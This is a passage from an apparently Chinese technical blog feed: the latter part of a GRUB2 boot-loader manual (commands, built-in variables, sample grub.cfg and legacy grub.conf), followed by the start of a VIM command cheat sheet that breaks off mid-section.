name</span><br></pre></td></tr></table></figure><p>通过文件[–file]、卷标[–label]、文件系统UUID[–fs-uuid]来搜索设备。</p><p>如果使用了”–set”选项，则会将第一个找到的设备设置为环境变量”var”的值，默认的变量”var”为’root’。</p><p>搜索时可使用”–no-floppy”选项来禁止搜索软盘，因为软盘速度非常慢，已经被淘汰了。</p><p>有时候还会指定”–hint=XXX”，表示优先选择满足提示条件的设备，若指定了多个hint条件，则优先匹配第一个hint，然后匹配第二个，依次类推。</p><p>例如：</p><blockquote><p>if [ x$feature_platform_search_hint = xy ]; then</p><p> search –no-floppy –fs-uuid –set=root  –hint-bios=hd0,msdos1 –hint-efi=hd0,msdos1  –hint-baremetal=ahci0,msdos1 –hint=’hd0,msdos1’  367d6a77-033b-4037-bbcb-416705ead095</p><p>else</p><p> search –no-floppy –fs-uuid –set=root 367d6a77-033b-4037-bbcb-416705ead095</p><p>fi</p><p>linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto quiet LANG=en_US.UTF-8</p><p>initrd16 /initramfs-3.10.0-327.el7.x86_64.img</p></blockquote><p>上述if语句中的第一个search中搜索uuid为”367d6a77-033b-4037-bbcb-416705ead095”的设备，但使用了多个hint选项，表示先匹配bios平台下/boot分区为(hd0,msdos1)的设备，之后还指定了几个hint，但因为search使用的是uuid搜索方式，所以这些hint选项是多余的，因为单磁盘上分区的uuid是唯一的。</p><p>再举个例子，如果某启动设备上有两个boot分区(如多系统共存时)，分别是(hd0,msdos1)和(hd0,msdos5)，如果此时不使用uuid搜索，而是使用label方式搜索:</p><blockquote><p>search –no-floppy –fs-label=boot –set=root –hint=hd0,msdos5</p></blockquote><p>则此时将会选中(hd0,msdos5)这个boot分区，若不使用hint，将选中(hd0,msdos1)这个boot分区。</p><h2 id="4-8-true和false命令"><a href="#4-8-true和false命令" class="headerlink" title="4.8 true和false命令"></a>4.8 true和false命令</h2><p>直接返回true或false布尔值。</p><h2 id="4-9-test-expression和-expression"><a href="#4-9-test-expression和-expression" class="headerlink" title="4.9 test expression和[ expression ]"></a>4.9 test expression和[ expression ]</h2><p>计算”expression”的结果是否为真，为真时返回0，否则返回非0，主要用于if、while或until结构中。</p><table><thead><tr><th><strong>string1 == string2</strong></th><th><strong>string1与string2相同</strong></th></tr></thead><tbody><tr><td><strong>string1 != string2</strong></td><td><strong>string1与string2不相同</strong></td></tr><tr><td><strong>string1 &lt; string2</strong></td><td><strong>string1在字母顺序上小于string2</strong></td></tr><tr><td><strong>string1 &lt;= string2</strong></td><td><strong>string1在字母顺序上小于等于string2</strong></td></tr><tr><td><strong>string1 &gt; string2</strong></td><td><strong>string1在字母顺序上大于string2</strong></td></tr><tr><td><strong>string1 &gt;= string2</strong></td><td><strong>string1在字母顺序上大于等于string2</strong></td></tr><tr><td><strong>integer1 -eq integer2</strong></td><td><strong>integer1等于integer2</strong></td></tr><tr><td><strong>integer1 -ge integer2</strong></td><td><strong>integer1大于或等于integer2</strong></td></tr><tr><td><strong>integer1 -gt integer2</strong></td><td><strong>integer1大于integer2</strong></td></tr><tr><td><strong>integer1 -le integer2</strong></td><td><strong>integer1小于或等于integer2</strong></td></tr><tr><td><strong>integer1 -lt integer2</strong></td><td><strong>integer1小于integer2</strong></td></tr><tr><td><strong>integer1 -ne integer2</strong></td><td><strong>integer1不等于integer2</strong></td></tr><tr><td><strong>prefixinteger1 -pgt prefixinteger2</strong></td><td><strong>剔除非数字字符串prefix部分之后，integer1大于integer2</strong></td></tr><tr><td><strong>prefixinteger1 -plt prefixinteger2</strong></td><td><strong>剔除非数字字符串prefix部分之后，integer1小于integer2</strong></td></tr><tr><td><strong>file1 -nt file2</strong></td><td><strong>file1的修改时间比file2新</strong></td></tr><tr><td><strong>file1 -ot file2</strong></td><td><strong>file1的修改时间比file2旧</strong></td></tr><tr><td><strong>-d file</strong></td><td><strong>file存在且是目录</strong></td></tr><tr><td><strong>-e file</strong></td><td><strong>file存在</strong></td></tr><tr><td><strong>-f file</strong></td><td><strong>file存在并且不是一个目录</strong></td></tr><tr><td><strong>-s file</strong></td><td><strong>file存在并且文件占用空间大于零</strong></td></tr><tr><td><strong>-n string</strong></td><td><strong>string的长度大于零</strong></td></tr><tr><td><strong>string</strong></td><td><strong>string的长度大于零，等价于-n string</strong></td></tr><tr><td><strong>-z string</strong></td><td><strong>string的长度等于零</strong></td></tr><tr><td><strong>( expression )</strong></td><td><strong>将expression作为一个整体</strong></td></tr><tr><td><strong>! expression</strong></td><td><strong>非(NOT)</strong></td></tr><tr><td><strong>expression1 -a expression2</strong></td><td><strong>与(AND)，也可以使用expression1 expression2，但不推荐</strong></td></tr><tr><td><strong>expression1 -o expression2</strong></td><td><strong>或(OR)</strong></td></tr></tbody></table><h2 id="4-10-cat命令"><a href="#4-10-cat命令" class="headerlink" title="4.10 cat命令"></a>4.10 cat命令</h2><p>读取文件内容，借此可以帮助判断哪个是boot分区，哪个是根分区。</p><p>交互式命令行下使用。</p><h2 id="4-11-clear命令"><a href="#4-11-clear命令" class="headerlink" title="4.11 clear命令"></a>4.11 clear命令</h2><p>清屏。</p><h2 id="4-12-configfile命令"><a href="#4-12-configfile命令" class="headerlink" title="4.12 configfile命令"></a>4.12 configfile命令</h2><p>立即装载一个指定的文件作为grub的配置文件。但注意，导入的文件中的环境变量不在当前生效。</p><p>在grub.cfg丢失时，该命令将排上用场。</p><h2 id="4-13-echo命令"><a href="#4-13-echo命令" class="headerlink" title="4.13 echo命令"></a>4.13 echo命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo&#96; &#96;[-n] [-e] string</span><br></pre></td></tr></table></figure><p>“-n”和”-e”用法同shell中echo。如果要引用变量，使用${var}的方式。</p><h2 id="4-14-export命令"><a href="#4-14-export命令" class="headerlink" title="4.14 export命令"></a>4.14 export命令</h2><p>导出环境变量，若在configfile的file中导出环境变量，将会在当前环境也生效。</p><h2 id="4-15-halt和reboot命令"><a href="#4-15-halt和reboot命令" class="headerlink" title="4.15 halt和reboot命令"></a>4.15 halt和reboot命令</h2><p>关机或重启</p><h2 id="4-16-ls命令"><a href="#4-16-ls命令" class="headerlink" title="4.16 ls命令"></a>4.16 ls命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls&#96; &#96;[args]</span><br></pre></td></tr></table></figure><p>如果不给定任何参数，则列出grub可见的设备。</p><p>如果给定的参数是一个分区，则显示该分区的文件系统信息。</p><p>如果给定的参数是一个绝对路径表示的目录，则显示该目录下的所有文件。</p><p>例如：</p><p><img src="/picture/16/10.png" alt="img"></p><h2 id="4-17-probe命令"><a href="#4-17-probe命令" class="headerlink" title="4.17 probe命令"></a>4.17 probe命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">probe [--&#96;&#96;set&#96; &#96;var] --partmap|--fs|--fs-uuid|--label device</span><br></pre></td></tr></table></figure><p>探测分区或磁盘的属性信息。如果未指定–set，则显示指定设备对应的信息。如果指定了–set，则将对应信息的值赋给变量var。</p><p>–partmap：显示是gpt还是mbr格式的磁盘。</p><p>–fs：显示分区的文件系统。</p><p>–fs-uuid：显示分区的uuid值。</p><p>–label：显示分区的label值。</p><h2 id="4-18-save-env和list-env命令"><a href="#4-18-save-env和list-env命令" class="headerlink" title="4.18 save_env和list_env命令"></a>4.18 save_env和list_env命令</h2><p>将环境变量保存到环境变量块中，以及列出当前的环境变量块中的变量。</p><p><img src="/picture/16/11.png" alt="img"></p><p><img src="/picture/16/12.png" alt="img"></p><h2 id="4-19-loopback命令"><a href="#4-19-loopback命令" class="headerlink" title="4.19 loopback命令"></a>4.19 loopback命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loopback [-d] device &#96;&#96;file</span><br></pre></td></tr></table></figure><p>将file映射为回环设备。使用-d选项则是删除映射。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loopback loop0 &#x2F;path&#x2F;to&#x2F;image</span><br><span class="line">ls (loop0)&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-20-normal和normal-exit命令"><a href="#4-20-normal和normal-exit命令" class="headerlink" title="4.20 normal和normal_exit命令"></a>4.20 normal和normal_exit命令</h2><p>进入和退出normal模式，normal是相对于救援模式而言的，只要不是在救援模式下，就是在normal模式下。</p><p>救援模式下，只能使用非常少的命令，而normal模式下则可以使用非常多的命令。</p><h2 id="4-21-password和password-pbkdf2命令"><a href="#4-21-password和password-pbkdf2命令" class="headerlink" title="4.21 password和password_pbkdf2命令"></a>4.21 password和password_pbkdf2命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password user &#96;&#96;clear&#96;&#96;-password&#96;&#96;password_pbkdf2 user hashed-password</span><br></pre></td></tr></table></figure><p>前者使用明文密码定义一个名为user的用户。不建议使用此命令。</p><p>后者使用哈希加密后的密码定义一个名为user的用户，加密的密码通过”grub-mkpasswd-pbkdf2”工具生成。建议使用该命令。</p><h1 id="5-几个常设置的内置变量"><a href="#5-几个常设置的内置变量" class="headerlink" title="5 几个常设置的内置变量"></a>5 几个常设置的内置变量</h1><h2 id="5-1-chosen变量"><a href="#5-1-chosen变量" class="headerlink" title="5.1 chosen变量"></a>5.1 chosen变量</h2><p>当开机时选中某个菜单项启动时，该菜单的title将被赋值给chosen变量。该变量一般只用于引用，而不用于修改。</p><h2 id="5-2-cmdpath变量"><a href="#5-2-cmdpath变量" class="headerlink" title="5.2 cmdpath变量"></a>5.2 cmdpath变量</h2><p>grub2加载的core.img的目录路径，是绝对路径，即包括了设备名的路径，如(hd0,gpt1)/boot/grub2/。该变量值不应该修改。</p><h2 id="5-3-default变量"><a href="#5-3-default变量" class="headerlink" title="5.3 default变量"></a>5.3 default变量</h2><p>指定默认的菜单项，一般其后都会跟随timeout变量。</p><p>default指定默认菜单时，可使用菜单的title，也可以使用菜单的id，或者数值顺序，当使用数值顺序指定default时，从0开始计算。</p><h2 id="5-4-timeout变量"><a href="#5-4-timeout变量" class="headerlink" title="5.4 timeout变量"></a>5.4 timeout变量</h2><p>设置菜单等待超时时间，设置为0时将直接启动默认菜单项而不显示菜单，设置为”-1”时将永久等待手动选择。</p><h2 id="5-5-fallback变量"><a href="#5-5-fallback变量" class="headerlink" title="5.5 fallback变量"></a>5.5 fallback变量</h2><p>当默认菜单项启动失败，则使用该变量指定的菜单项启动，指定方式同default，可使用数值(从0开始计算)、title或id指定。</p><h2 id="5-6-grub-platform变量"><a href="#5-6-grub-platform变量" class="headerlink" title="5.6 grub_platform变量"></a>5.6 grub_platform变量</h2><p>指定该平台是”pc”还是”efi”，pc表示的就是传统的bios平台。</p><p>该变量不应该被修改，而应该被引用，例如用于if判断语句中。</p><h2 id="5-7-prefix变量"><a href="#5-7-prefix变量" class="headerlink" title="5.7 prefix变量"></a>5.7 prefix变量</h2><p>在grub启动的时候，grub自动将/boot/grub2目录的绝对路径赋值给该变量，使得以后可以直接从该变量所代表的目录下加载各文件或模块。</p><p>例如，可能自动设置为：</p><blockquote><p>set prefix = (hd0,gpt1)/boot/grub2/</p></blockquote><p>所以可以使用”$prefix/grubN.cfg”来引用/boot/grub2/grubN.cfg文件。</p><p>该变量不应该修改，且若手动设置，则必须设置正确，否则牵一发而动全身。</p><h2 id="5-8-root变量"><a href="#5-8-root变量" class="headerlink" title="5.8 root变量"></a>5.8 root变量</h2><p>该变量指定根设备的名称，使得后续使用从”/“开始的相对路径引用文件时将从该root变量指定的路径开始。一般该变量是grub启动的时候由grub根据prefix变量设置而来的。</p><p>例如prefix=(hd0,gpt1)/boot/grub2，则root=(hd0,gpt1)，后续就可以使用相对路径/vmlinuz-XXX表示(hd0,gpt1)/vmlinuz-XXX文件。</p><p>注意：在Linux中，从根”/“开始的路径表示绝对路径，如/etc/fstab。但grub中，从”/“开始的表示相对路径，其相对的基准是root变量设置的值，而使用”(dev_name)/“开始的路径才表示绝对路径。</p><p><strong>一般root变量都表示/boot所在的分区</strong>，但这不是绝对的，如果设置为根文件系统所在分区，如root=(hd0,gpt2)，则后续可以使用/etc/fstab来引用”(hd0,gpt2)/etc/fstab”文件。</p><p>该变量在grub2中一般不用修改，但若修改则必须指定正确。</p><p>另外，root变量还应该于linux或linux16命令所指定的内核启动参数”root=”区分开来，内核启动参数中的”root=”的意义是固定的，其指定的是根文件系统所在分区。例如：</p><blockquote><p><strong>set root=’hd0,msdos1’</strong></p><p>linux16 /vmlinuz-3.10.0-327.el7.x86_64 <strong>root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8</strong> ro crashkernel=auto quiet LANG=en_US.UTF-8</p><p>initrd16 /initramfs-3.10.0-327.el7.x86_64.img</p></blockquote><p>一般情况下，/boot都会单独分区，所以root变量指定的根设备和root启动参数所指定的根分区不是同一个分区，除非/boot不是单独的分区，而是在根分区下的一个目录。</p><h1 id="6-grub配置和安装示例"><a href="#6-grub配置和安装示例" class="headerlink" title="6 grub配置和安装示例"></a>6 grub配置和安装示例</h1><p>首先写一个grub.cfg。例如此处，在msdos磁盘上安装了两个操作系统，CentOS 7和CentOS 6。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 设置一些全局环境变量</span><br><span class="line">set default&#x3D;0</span><br><span class="line">set fallback&#x3D;1</span><br><span class="line">set timeout&#x3D;3</span><br><span class="line"></span><br><span class="line"># 将可能使用到的模块一次性装载完</span><br><span class="line"># 支持msdos的模块</span><br><span class="line">insmod part_msdos</span><br><span class="line"># 支持各种文件系统的模块</span><br><span class="line">insmod exfat</span><br><span class="line">insmod ext2</span><br><span class="line">insmod xfs</span><br><span class="line">insmod fat</span><br><span class="line">insmod iso9660</span><br><span class="line"></span><br><span class="line"># 定义菜单</span><br><span class="line">menuentry &#39;CentOS 7&#39; --unrestricted &#123;</span><br><span class="line">        search --no-floppy --fs-uuid --set&#x3D;root 367d6a77-033b-4037-bbcb-416705ead095</span><br><span class="line">        linux16 &#x2F;vmlinuz-3.10.0-327.el7.x86_64 root&#x3D;UUID&#x3D;b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro biosdevname&#x3D;0 net.ifnames&#x3D;0 quiet</span><br><span class="line">        initrd16 &#x2F;initramfs-3.10.0-327.el7.x86_64.img</span><br><span class="line">&#125;</span><br><span class="line">menuentry &#39;CentOS 6&#39; --unrestricted &#123;</span><br><span class="line">        search --no-floppy --fs-uuid --set&#x3D;root f5d8939c-4a04-4f47-a1bc-1b8cbabc4d32</span><br><span class="line">        linux16 &#x2F;vmlinuz-2.6.32-504.el6.x86_64 root&#x3D;UUID&#x3D;edb1bf15-9590-4195-aa11-6dac45c7f6f3 ro quiet</span><br><span class="line">        initrd16 &#x2F;initramfs-2.6.32-504.el6.x86_64.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行grub安装操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-install &#x2F;dev&#x2F;sda</span><br></pre></td></tr></table></figure><h1 id="7-传统grub简述"><a href="#7-传统grub简述" class="headerlink" title="7 传统grub简述"></a>7 传统grub简述</h1><p>因为本文主要介绍grub2，所以传统的grub只简单介绍下，其实前面已经提及了很多传统grub和grub2的比较了。另外，传统grub已足够强大，足够应付一般的需求。</p><h2 id="7-1-grub安装"><a href="#7-1-grub安装" class="headerlink" title="7.1 grub安装"></a>7.1 grub安装</h2><p>例如安装到/dev/sda上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub-install &#x2F;dev&#x2F;sda</span><br></pre></td></tr></table></figure><h2 id="7-2-grub-conf配置"><a href="#7-2-grub-conf配置" class="headerlink" title="7.2 grub.conf配置"></a>7.2 grub.conf配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">default&#x3D;0  # 默认启动第一个系统</span><br><span class="line">timeout&#x3D;5  # 等待超时时间5秒</span><br><span class="line">splashimage&#x3D;(hd0,0)&#x2F;grub&#x2F;splash.xpm.gz  # 背景图片</span><br><span class="line">hiddenmenu  # 隐藏菜单，若要显式，在启动时按下ESC</span><br><span class="line">title Red Hat Enterprise Linux AS (2.6.18-92.el5)  # 定义操作系统的说明信息</span><br><span class="line">    root (hd0,0) </span><br><span class="line">    kernel &#x2F;vmlinuz-2.6.18-92.el5 ro root＝&#x2F;dev&#x2F;sda2 rhgb quiet</span><br><span class="line">    initrd &#x2F;initrd-2.6.18-92.el5.img</span><br></pre></td></tr></table></figure><p>在说明配置方法之前，需要说明一个关键点，boot是否是一个独立的分区，它影响后面路径的配置。</p><p>在一个正常的操作系统中查看/boot/grub/grub.conf文件，可以在NOTICE段看到提示，说你是否拥有一个独立的boot分区？如果有则意味着kernel和initrd的路径是从/开始的而不是/boot开始的，如/vmlinuz-xxx，如果没有独立的boot分区，则kernel和initrd的路径中需要指明boot路径，例如Boot没有分区而是在/文件系统下的一个目录，则/boot/vmlinuz-xxx。</p><p>root  (hd0,0)定义grub识别的根。一般定义的都是boot所在的分区，grub只能识别hd，所以这里只能使用hd，hd0表示在第一块磁盘上，hd0,0的第二个0表示boot在第一个分区上，grub2在分区的计算上是从1开始的，这是传统grub和grub2不同的地方。</p><p>kernel定义内核文件的路径和启动参数，等价于grub2的linux命令或linux16命令。首先说明参数，ro表示只读，root=/dev/sda[N]或者root=UUID=”device_uuid_num”指定根文件系统所在的分区，这是必须的参数。rhgb表示在操作系统启动过程中使用图形界面输出一些信息，将其省略可以加快启动速度，quiet表示启动操作系统时静默输出信息。再说明路径，如果是boot是独立分区的，则kernel的路径定义方式为/vmlinuz-xxx，如果没有独立分区，则指明其绝对路径，一般都是在根文件系统下的目录，所以一般为/boot/vmlinuz-xxx。</p><p>initrd定义init ramdisk的路径，路径的定义方式同kernel。除了路径之外没有任何参数。</p><p><img src="/picture/16/13.png" alt="img"></p><p>或者使用下图的UUID的方式。</p><p><img src="/picture/16/14.png" alt="img"></p><p>如果没有指定root=的选项，将报错“no or empty root …… dracut…kernel panic”的错误。如下图。</p><p><img src="/picture/16/15.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-基础内容&quot;&gt;&lt;a href=&quot;#1-基础内容&quot; class=&quot;headerlink&quot; title=&quot;1 基础内容&quot;&gt;&lt;/a&gt;1 基础内容&lt;/h1&gt;&lt;h2 id=&quot;1-1-grub2和grub的区别&quot;&gt;&lt;a href=&quot;#1-1-grub2和grub的区别&quot; c
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="系统引导" scheme="http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%BC%95%E5%AF%BC/"/>
    
  </entry>
  
  <entry>
    <title>VIM手册</title>
    <link href="http://yoursite.com/2020/02/06/VIM%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/06/VIM%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-05T16:21:49.000Z</published>
    <updated>2020-02-26T16:41:01.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-vim模式"><a href="#1-vim模式" class="headerlink" title="1. vim模式#"></a>1. vim模式<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_0" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy正常模式（按Esc或Ctrl+[进入） 左下角显示文件名或为空</span><br><span class="line">插入模式（按i进入） 左下角显示--INSERT--</span><br><span class="line">可视模式（按v进入） 左下角显示--VISUAL--</span><br></pre></td></tr></table></figure><h2 id="2-打开文件"><a href="#2-打开文件" class="headerlink" title="2. 打开文件#"></a>2. 打开文件<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_1" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# 打开单个文件</span><br><span class="line">vim file    </span><br><span class="line"># 同时打开多个文件</span><br><span class="line">vim file1 file2..  </span><br><span class="line"></span><br><span class="line"># 在vim窗口中打开一个新文件</span><br><span class="line">:open [file]       </span><br><span class="line"></span><br><span class="line">【举个例子】</span><br><span class="line"># 当前打开1.txt，做了一些编辑没保存</span><br><span class="line">:open!         放弃这些修改，并重新打开未修改的文件</span><br><span class="line"></span><br><span class="line"># 当前打开1.txt，做了一些编辑并保存</span><br><span class="line">:open 2.txt    直接退出对1.txt的编辑，直接打开2.txt编辑，省了退出:wq再重新vim 2.txt的步骤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 打开远程文件，比如ftp或者share folder</span><br><span class="line">:e ftp:&#x2F;&#x2F;192.168.10.76&#x2F;abc.txt</span><br><span class="line">:e \qadrive\test\1.txt</span><br><span class="line"></span><br><span class="line"># 以只读形式打开文件，但是仍然可以使用 :wq! 写入</span><br><span class="line">vim -R file </span><br><span class="line"></span><br><span class="line"># 强制性关闭修改功能，无法使用 :wq! 写入</span><br><span class="line">vim -M file</span><br></pre></td></tr></table></figure><h2 id="3-插入命令"><a href="#3-插入命令" class="headerlink" title="3. 插入命令#"></a>3. 插入命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_2" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyi 在当前位置生前插入</span><br><span class="line">I 在当前行首插入</span><br><span class="line"></span><br><span class="line">a 在当前位置后插入</span><br><span class="line">A 在当前行尾插入</span><br><span class="line"></span><br><span class="line">o 在当前行之后插入一行</span><br><span class="line">O 在当前行之前插入一行</span><br></pre></td></tr></table></figure><h2 id="4-查找命令"><a href="#4-查找命令" class="headerlink" title="4. 查找命令#"></a>4. 查找命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_3" target="_blank" rel="noopener">#</a></h2><p>最简单的查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy&#x2F;text　　查找text，按n健查找下一个，按N健查找前一个。</span><br><span class="line">?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。</span><br><span class="line"></span><br><span class="line">vim中有一些特殊字符在查找时需要转义　　.*[]^%&#x2F;?~$</span><br><span class="line"></span><br><span class="line">:set ignorecase　　忽略大小写的查找</span><br><span class="line">:set noignorecase　　不忽略大小写的查找</span><br></pre></td></tr></table></figure><p>快速查找，不需要手打字符即可查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy*        向后（下）寻找游标所在处的单词</span><br><span class="line">#        向前（上）寻找游标所在处的单词</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以上两种查找，n,N 的继续查找命令依然可以适用</span><br></pre></td></tr></table></figure><p>精准查找：匹配单词查找</p><p>如果文本中有 <code>hello</code>，<code>helloworld</code>，<code>hellopython</code></p><p>那我使用 /hello ，这三个词都会匹配到。</p><p>有没有办法实现精准查找呢？可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy</span><br><span class="line">Copy&#x2F;hello\&gt;</span><br></pre></td></tr></table></figure><p>精准查找：匹配行首、行末</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy# hello位于行首</span><br><span class="line">&#x2F;^hello</span><br><span class="line"></span><br><span class="line"># world位于行末</span><br><span class="line">&#x2F;world$</span><br></pre></td></tr></table></figure><h2 id="5-替换命令"><a href="#5-替换命令" class="headerlink" title="5. 替换命令#"></a>5. 替换命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_4" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CopyCopy~  反转游标字母大小写</span><br><span class="line"></span><br><span class="line">r&lt;字母&gt;           将当前字符替换为所写字母</span><br><span class="line">R&lt;字母&gt;&lt;字母&gt;...  连续替换字母</span><br><span class="line"></span><br><span class="line">cc    替换整行（就是删除当前行，并在下一行插入）</span><br><span class="line">cw    替换一个单词（就是删除一个单词，就进入插入模式），前提是游标处于单词第一个字母（可用b定位）</span><br><span class="line">C     (大写C)替换至行尾（和D有所区别，D是删除（剪切）至行尾，C是删除至行位并进入插入模式）</span><br><span class="line"></span><br><span class="line">:s&#x2F;old&#x2F;new&#x2F;    用old替换new，替换当前行的第一个匹配</span><br><span class="line">:s&#x2F;old&#x2F;new&#x2F;g   用old替换new，替换当前行的所有匹配</span><br><span class="line"></span><br><span class="line">:%s&#x2F;old&#x2F;new&#x2F;   用old替换new，替换所有行的第一个匹配</span><br><span class="line">:%s&#x2F;old&#x2F;new&#x2F;g  用old替换new，替换整个文件的所有匹配</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:10,20 s&#x2F;^&#x2F; &#x2F;g 在第10行至第20行每行前面加四个空格，用于缩进。</span><br><span class="line"></span><br><span class="line">ddp    交换光标所在行和其下紧邻的一行。</span><br></pre></td></tr></table></figure><h2 id="6-撤销与重做"><a href="#6-撤销与重做" class="headerlink" title="6. 撤销与重做#"></a>6. 撤销与重做<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_5" target="_blank" rel="noopener">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyu 撤销（Undo）</span><br><span class="line"></span><br><span class="line">U 撤销对整行的操作</span><br><span class="line"></span><br><span class="line">Ctrl + r 重做（Redo），即撤销的撤销。</span><br></pre></td></tr></table></figure><h2 id="7-删除命令"><a href="#7-删除命令" class="headerlink" title="7. 删除命令#"></a>7. 删除命令<a href="https://www.cnblogs.com/wongbingming/p/11305216.html#idx_6" target="_blank" rel="noopener">#</a></h2><p>需要说明的是，vim 其实并没有单纯的删除命令，下面你或许理解为剪切更加准确。</p><p>以字符为单位删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CopyCopyx   删除当前字符</span><br><span class="line">3x  删除当前字符3次</span><br><span class="line"></span><br><span class="line">X   删除当前字符的前一个字符。</span><br><span class="line">3X  删除当前光标向前三个字符</span><br><span class="line"></span><br><span class="line">dl  删除当前字符， dl&#x3D;x</span><br><span class="line">dh  删除前一个字符，X&#x3D;dh</span><br><span class="line"></span><br><span class="line">D   